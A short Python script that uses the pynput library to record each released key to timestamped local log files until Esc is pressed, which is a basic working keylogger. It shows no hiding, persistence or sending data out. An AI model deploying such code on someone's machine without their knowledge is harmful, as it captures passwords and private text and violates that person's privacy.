#!/usr/bin/env python3

from pynput.keyboard import Listener, Key
from datetime import datetime

def generate_logs(text: str) -> None:
    '''
        Write logs of keys was pressed
    '''
    logs = f'logs/logs-{datetime.now().strftime("%d_%m_%Y_%I_%M_%S_%p")}.txt'
    with open(logs, "a") as log:
        log.write(text)

def vigilant(key):
    try:
        generate_logs(str(key.char))
    except AttributeError as identifier:
        generate_logs(f"< {str(key)} > ")
    if key == Key.esc:
        return False

with Listener(on_release=vigilant) as listener:
    listener.join()